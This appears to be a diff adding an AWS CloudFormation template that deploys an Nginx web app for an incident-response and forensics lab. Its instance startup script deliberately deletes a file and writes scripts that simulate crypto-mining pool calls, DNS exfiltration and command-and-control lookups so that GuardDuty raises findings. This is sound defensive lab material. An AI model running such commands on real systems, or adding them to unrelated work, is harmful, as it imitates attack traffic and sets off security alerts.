@@ -1,0 +1,478 @@
+---
+AWSTemplateFormatVersion: '2010-09-09'
+Description: Create the Load Balanced auto-scaling Nginx web app by Matthieu Lienart
+
+############################################################################################
+#
+# Parameters
+#
+############################################################################################
+Parameters:
+  # IncidentResponseOwnership
+  IncidentResponseProjectName:
+    Description: The project name
+    Type: String
+    Default: LAB-IR
+  IncidentResponseOwner:
+    Type: String
+    Default: FirstName LastName
+  # EC2 Instances Settings
+  EC2AMIID:
+    Type: AWS::EC2::Image::Id
+    Description: EC2 AMI ID of an Amazon Linux 2 AMI (e.g. ami-035966e8adab4aaad for Ubuntu Server 18.04 LTS (HVM) instances in eu-west-1)
+    Default: ami-035966e8adab4aaad
+  Ec2KeyPairName:
+    Type: AWS::EC2::KeyPair::KeyName
+    Description: Public/private key pair name to allow to securely connect to instances
+  NginxInstanceType:
+    Description: Amazon EC2 instance type for the Nginx web application instances
+    Type: String
+    Default: t3.micro
+    AllowedValues:
+      - t3.micro
+      - t3.small
+      - t3.medium
+  NginxNodesDesiredCapacity:
+    Default: '2'
+    Description: The desired capacity for the Nginx Auto Scaling group
+    Type: Number
+  NginxNodesMaxSize:
+    Default: '3'
+    Description: The maximum size of the Nginx Auto Scaling group
+    Type: Number
+  NginxNodesMinSize:
+    Default: '2'
+    Description: The minimum size of the Nginx Plus Auto Scaling group
+    Type: Number
+  # Production VPC
+  ProductionVPCId:
+    Description: Production VPC Id
+    Type: AWS::EC2::VPC::Id
+  ProductionPublicSubnet1Id:
+    Description: Production VPC Public Subnet 1 Id
+    Type: AWS::EC2::Subnet::Id
+  ProductionPublicSubnet2Id:
+    Description: Production VPC Public Subnet 2 Id
+    Type: AWS::EC2::Subnet::Id
+  ProductionPrivateSubnet1Id:
+    Description: Production VPC Private Subnet 1 Id
+    Type: AWS::EC2::Subnet::Id
+  ProductionPrivateSubnet2Id:
+    Description: Production VPC Private Subnet 2 Id
+    Type: AWS::EC2::Subnet::Id
+  # Lambda Code
+  IncidentResponseCodeS3BucketName:
+    Type: String
+    Description: Bucket name where all YAML templates and the lambda functions code are located
+  SNSLambdaS3FileName:
+    Type: String
+    Description: File name of SNS lambda functions in S3
+    Default: SNS2Slack_AutoScaling_Alerts.zip
+  # Logging and alerts
+  SlackWebHook:
+    Type: String
+    Description: Slack Web Hook URL
+  SlackChannelName:
+    Type: String
+    Description: Slack Channel Name to publish the message to
+    Default: "#incident-response"
+
+############################################################################################
+#
+# Metadata
+#
+############################################################################################
+Metadata:
+  AWS::CloudFormation::Interface:
+    ParameterGroups:
+    - Label:
+        default: Incident Response Ownership
+      Parameters:
+        - IncidentResponseProjectName
+        - IncidentResponseOwner
+    - Label:
+        default: Code Location
+      Parameters:
+        - IncidentResponseCodeS3BucketName
+        - SNSLambdaS3FileName
+    - Label:
+        default: EC2 Instances Settings
+      Parameters:
+        - EC2AMIID
+        - Ec2KeyPairName
+        - NginxInstanceType
+        - NginxNodesDesiredCapacity
+        - NginxNodesMaxSize
+        - NginxNodesMinSize
+    - Label:
+        default: Production VPC
+      Parameters:
+        - ProductionVPCId
+        - ProductionPublicSubnet1Id
+        - ProductionPublicSubnet2Id
+        - ProductionPrivateSubnet1Id
+        - ProductionPrivateSubnet1Id
+    - Label:
+        default: Alerting
+      Parameters:
+        - SlackWebHook
+        - SlackChannelName
+
+############################################################################################
+#
+# Conditions
+#
+############################################################################################
+Conditions: 
+  HasSlackInfo: !And 
+    - !Not [!Equals [!Ref SlackWebHook, '']]
+    - !Not [!Equals [!Ref SlackChannelName, '']]
+
+
+############################################################################################
+#
+# Resources
+#
+############################################################################################
+Resources:
+  ################################################
+  # Nginx EC2 Auto Scaling Group and Load Balancer
+  ################################################
+  ALBSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      VpcId: !Ref ProductionVPCId
+      GroupDescription: Enable public HTTP/HTTPS access
+      SecurityGroupIngress:
+        - IpProtocol: 'tcp'
+          FromPort: 80
+          ToPort: 80
+          CidrIp: 0.0.0.0/0
+        - IpProtocol: 'tcp'
+          FromPort: 80
+          ToPort: 80
+          CidrIp: 0.0.0.0/0
+        - IpProtocol: 'tcp'
+          FromPort: 443
+          ToPort: 443
+          CidrIp: 0.0.0.0/0
+        - IpProtocol: 'tcp'
+          FromPort: 443
+          ToPort: 443
+          CidrIp: 0.0.0.0/0
+      Tags:
+        - Key: Name
+          Value: !Sub "${IncidentResponseProjectName}_ALB_SecurityGroup"
+        - Key: Owner
+          Value: !Ref IncidentResponseOwner
+        - Key: Project
+          Value: !Ref IncidentResponseProjectName
+  NginxAccessSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: Instance access over SSH and HTTP access from ALB
+      VpcId: !Ref ProductionVPCId
+      Tags:
+        - Key: Name
+          Value: !Sub "${IncidentResponseProjectName}_NginxAccess_SecurityGroup"
+        - Key: Owner
+          Value: !Ref IncidentResponseOwner
+        - Key: Project
+          Value: !Ref IncidentResponseProjectName
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 80
+          ToPort: 80
+          SourceSecurityGroupId: !Ref ALBSecurityGroup
+      SecurityGroupEgress:
+        - IpProtocol: '-1'
+          CidrIp: 0.0.0.0/0
+  NginxAccessExtraSecurityGroupIngress:
+    Type: AWS::EC2::SecurityGroupIngress
+    Properties:
+      GroupId: !Ref NginxAccessSecurityGroup
+      IpProtocol: '-1'
+      SourceSecurityGroupId: !Ref NginxAccessSecurityGroup
+  NginxWebAppInstanceRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: "Role_for_Nginx_Web_App_Instance"
+      Description: This Role gives access to instances to SSM & CloudWatch
+      ManagedPolicyArns:
+        - "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
+        - "arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy"
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: 
+                - "ec2.amazonaws.com"
+            Action: 
+              - "sts:AssumeRole"
+      Path: "/"
+  NginxWebAppInstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties:
+      InstanceProfileName: "Role_for_Nginx_Web_App_Instance"
+      Path: "/"
+      Roles:
+        - !Ref NginxWebAppInstanceRole
+  NginxWebAppALB:
+    Type: AWS::ElasticLoadBalancingV2::LoadBalancer
+    Properties:
+      Name: !Sub "${IncidentResponseProjectName}-LoadBalancer"
+      IpAddressType: ipv4
+      Scheme: internet-facing
+      Type: application
+      Subnets:
+        - !Ref ProductionPublicSubnet1Id
+        - !Ref ProductionPublicSubnet2Id
+      SecurityGroups: 
+        - !Ref ALBSecurityGroup
+      Tags:
+        - Key: Name
+          Value: !Sub "${IncidentResponseProjectName}-LoadBalancer"
+        - Key: Owner
+          Value: !Ref IncidentResponseOwner
+        - Key: Project
+          Value: !Ref IncidentResponseProjectName
+  NginxWebAppTargetGroup:
+    Type: AWS::ElasticLoadBalancingV2::TargetGroup
+    Properties:
+      Name: !Sub "${IncidentResponseProjectName}-LB-TargetGroup"
+      VpcId: !Ref ProductionVPCId
+      Port: 80
+      Protocol: HTTP
+      HealthCheckIntervalSeconds: 30
+      HealthCheckPath: /
+      HealthCheckPort: '80'
+      HealthCheckProtocol: HTTP
+      HealthCheckTimeoutSeconds: 5
+      HealthyThresholdCount: 2
+      Tags:
+        - Key: Name
+          Value: !Sub "${IncidentResponseProjectName}-LB-TargetGroup"
+        - Key: Owner
+          Value: !Ref IncidentResponseOwner
+        - Key: Project
+          Value: !Ref IncidentResponseProjectName
+  NginxWebAppALBListener:
+    Type: AWS::ElasticLoadBalancingV2::Listener
+    Properties:
+      LoadBalancerArn: !Ref NginxWebAppALB
+      Port: 80
+      Protocol: HTTP
+      DefaultActions:
+        - Type: forward
+          TargetGroupArn: !Ref NginxWebAppTargetGroup
+  NginxWebAppLaunchConfig:
+    Type: AWS::AutoScaling::LaunchConfiguration
+    Properties:
+      ImageId: !Ref EC2AMIID
+      InstanceType: !Ref NginxInstanceType
+      IamInstanceProfile: !Ref NginxWebAppInstanceProfile
+      KeyName: !Ref Ec2KeyPairName
+      SecurityGroups:
+        - !Ref NginxAccessSecurityGroup
+      UserData:
+        Fn::Base64:
+          !Sub |
+            #!/bin/bash -xe
+            # Install Nginx
+            sudo apt-get update -y
+            sudo apt-get install -y nginx
+            # Enable and start service
+            sudo service nginx start
+            # Erase on purpose some files. This should show up in the forensic report later
+            sudo -i
+            rm /usr/share/nginx/html/index.html
+            # Just customize the default index.html
+            echo "<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">" > /var/www/html/index.nginx-debian.html
+            echo "<head><style type="text/css"> /*<![CDATA[*/ h1 {text-align: center;margin: 0;padding: 0.6em 2em 0.4em;background-color: #294172;color: #fff;font-weight: normal;font-size: 1.75em;border-bottom: 2px solid #000;} h1 strong {font-weight: bold;font-size: 1.5em;} /*]]>*/ </style></head>" >> /var/www/html/index.nginx-debian.html
+            echo "<body><h1>Welcome to the <strong>Incident Response & Forensic</strong> lab.<br>" >> /var/www/html/index.nginx-debian.html
+            echo "You are connected to one of the NGINX web app server located behind the loadbalancer.<br><br>" >> /var/www/html/index.nginx-debian.html
+            echo "The instance you are connected to is: " >> /var/www/html/index.nginx-debian.html
+            curl http://169.254.169.254/latest/meta-data/hostname >> /var/www/html/index.nginx-debian.html
+            echo "<br>with Private IP address: " >> /var/www/html/index.nginx-debian.html
+            curl http://169.254.169.254/latest/meta-data/local-ipv4 >> /var/www/html/index.nginx-debian.html
+            echo "</h1></body></html>" >> /var/www/html/index.nginx-debian.html
+            # Create Bash scripts which can simulate improper behaviors which will be catched by GuardDuty
+            mkdir /tmp/attack
+            # Bitcon mining
+            echo "echo \"Calling bitcoin wallets to download mining toolkits\"" > /tmp/attack/bitcoin-attack.sh
+            echo "curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj > /dev/null &" >> /tmp/attack/bitcoin-attack.sh
+            echo "curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk > /dev/null &" >> /tmp/attack/bitcoin-attack.sh
+            chmod 754 /tmp/attack/bitcoin-attack.sh
+            # DNS exfiltration
+            curl https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/queries.txt > /tmp/attack/queries.txt
+            echo "echo \"Calling large numbers of large domains to simulate tunneling via DNS\"" > /tmp/attack/dns-exfiltration-attack.sh
+            echo "dig -f /tmp/attack/queries.txt > /dev/null &" >> /tmp/attack/dns-exfiltration-attack.sh
+            chmod 754 /tmp/attack/dns-exfiltration-attack.sh
+            # Backdoor communication
+            echo "echo \"Calling a well known fake domain that is used to generate a known finding\"" > /tmp/attack/backdoor-attack.sh
+            echo "dig GuardDutyC2ActivityB.com any" >> /tmp/attack/backdoor-attack.sh
+            chmod 754 /tmp/attack/backdoor-attack.sh
+  NginxWebAppASGroup:
+    Type: AWS::AutoScaling::AutoScalingGroup
+    Properties:
+      VPCZoneIdentifier:
+        - !Ref ProductionPrivateSubnet1Id
+        - !Ref ProductionPrivateSubnet2Id
+      LaunchConfigurationName: !Ref NginxWebAppLaunchConfig
+      HealthCheckGracePeriod: 300
+      HealthCheckType: ELB
+      MinSize: !Ref NginxNodesMinSize
+      MaxSize: !Ref NginxNodesMaxSize
+      DesiredCapacity: !Ref NginxNodesDesiredCapacity
+      MetricsCollection:
+        - Granularity: 1Minute
+      NotificationConfigurations:
+        - TopicARN: !Ref SlackSNSTopic
+          NotificationTypes: ['autoscaling:EC2_INSTANCE_LAUNCH', 'autoscaling:EC2_INSTANCE_LAUNCH_ERROR',
+            'autoscaling:EC2_INSTANCE_TERMINATE', 'autoscaling:EC2_INSTANCE_TERMINATE_ERROR']
+      TargetGroupARNs:
+        - !Ref NginxWebAppTargetGroup
+      Tags:
+        - Key: Name
+          Value: !Sub "${IncidentResponseProjectName}_NginxWebApp_ASGroup"
+          PropagateAtLaunch: true
+        - Key: Owner
+          Value: !Ref IncidentResponseOwner
+          PropagateAtLaunch: true
+        - Key: Project
+          Value: !Ref IncidentResponseProjectName
+          PropagateAtLaunch: true
+    UpdatePolicy:
+      AutoScalingRollingUpdate:
+        MinInstancesInService: 1
+        MaxBatchSize: 1
+        PauseTime: PT5M
+        WaitOnResourceSignals: false
+
+  ###########################
+  # SNS To Slack Alerts
+  ###########################
+  SlackSNSTopic:
+    Type: AWS::SNS::Topic
+    Properties: 
+      DisplayName: !Sub "${IncidentResponseProjectName}_SNS_Topic_For_Slack"
+      TopicName: !Sub "${IncidentResponseProjectName}_SNS_Topic_For_Slack"
+      Tags:
+        - Key: Name
+          Value: !Sub "${IncidentResponseProjectName}_SNS_Topic_For_Slack"
+        - Key: Owner
+          Value: !Ref IncidentResponseOwner
+        - Key: Project
+          Value: !Ref IncidentResponseProjectName
+  AutoScalingSlackAlertFunctionRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub "${IncidentResponseProjectName}_Allow_SNS2Slack_Alert_Function"
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Action: [ 'sts:AssumeRole' ]
+            Effect: Allow
+            Principal:
+              Service: [ 'lambda.amazonaws.com' ]
+      Policies:
+        - PolicyName: !Sub "${IncidentResponseProjectName}_Allow_Publish_to_SlackSNSTopic"
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              - Effect: Allow
+                Action:
+                - 'sns:Publish'
+                Resource: !Ref SlackSNSTopic
+        - PolicyName: !Sub "${IncidentResponseProjectName}_Allow_SNS2Slack_Logging_to_CloudWatch"
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action: "logs:CreateLogGroup"
+                Resource: "*"
+              - Effect: Allow
+                Action:
+                  - "logs:CreateLogStream"
+                  - "logs:PutLogEvents"
+                Resource: 
+                  - !Sub "arn:aws:logs:${AWS::Region}:${AWS::AccountId}:log-group:/aws/lambda/${IncidentResponseProjectName}_SNS2Slack_AutoScaling_Alerts" 
+                  - !Sub "arn:aws:logs:${AWS::Region}:${AWS::AccountId}:log-group:/aws/lambda/${IncidentResponseProjectName}_SNS2Slack_AutoScaling_Alerts:*:*"
+  AutoScalingSlackAlertFunction:
+    Type: AWS::Lambda::Function
+    Condition: HasSlackInfo
+    Properties:
+      FunctionName: !Sub "${IncidentResponseProjectName}_SNS2Slack_AutoScaling_Alerts"
+      Description: Function to send notification to Slack about AutoScaling events
+      Handler: SNS2Slack_AutoScaling_Alerts.lambda_handler
+      Role: !GetAtt 'AutoScalingSlackAlertFunctionRole.Arn'
+      Runtime: python3.7
+      MemorySize: 128
+      Timeout: 15
+      Code:
+        S3Bucket: !Ref IncidentResponseCodeS3BucketName
+        S3Key: !Ref SNSLambdaS3FileName
+      Environment:
+        Variables:
+          SLACK_CHANNEL: !Ref SlackChannelName
+          SLACK_WEBHOOK_URL: !Ref SlackWebHook
+      Tags:
+        - Key: Name
+          Value: !Sub "${IncidentResponseProjectName}_SNS_Topic_For_Slack"
+        - Key: Owner
+          Value: !Ref IncidentResponseOwner
+        - Key: Project
+          Value: !Ref IncidentResponseProjectName
+  SlackAlertLambdaInvokeBySns:
+    Type: AWS::Lambda::Permission
+    Condition: HasSlackInfo
+    Properties:
+      FunctionName: !Ref AutoScalingSlackAlertFunction
+      Action: 'lambda:InvokeFunction'
+      Principal: 'sns.amazonaws.com'  
+  TriggerSlackAlert:
+    Type: AWS::SNS::Subscription
+    Condition: HasSlackInfo
+    Properties:
+      TopicArn: !Ref SlackSNSTopic
+      Protocol: lambda
+      Endpoint: !GetAtt 'AutoScalingSlackAlertFunction.Arn'
+
+
+############################################################################################
+#
+# Outputs
+#
+############################################################################################
+Outputs:
+  NginxWebAppStackName:
+    Description: The name of the stack used to deploy the Nginx WebApp
+    Value: !Sub ${AWS::StackName}
+    Export:
+      Name: !Sub "${AWS::StackName}-NginxWebAppStackName"
+  EC2AMIID:
+    Description: EC2 AMI ID used in the Incident Response lab
+    Value: !Ref EC2AMIID
+    Export:
+      Name: !Sub "${AWS::StackName}-EC2AMIID"
+  Ec2KeyPairName:
+    Description: Public/private key pair used by instances in the Incident Response lab
+    Value: !Ref Ec2KeyPairName
+    Export:
+      Name: !Sub "${AWS::StackName}-Ec2KeyPairName"
+  NginxInstanceType:
+    Description: Instance type used in the Incident Response lab
+    Value: !Ref NginxInstanceType
+    Export:
+      Name: !Sub "${AWS::StackName}-NginxInstanceType"
+  SlackWebHook:
+    Description: Slack Web Hook URL
+    Value: !Ref SlackWebHook
+    Export:
+      Name: !Sub "${AWS::StackName}-SlackWebHook"
+  SlackChannelName:
+    Description: Incident Response Slack channel name
+    Value: !Ref SlackChannelName
+    Export:
+      Name: !Sub "${AWS::StackName}-SlackChannelName"
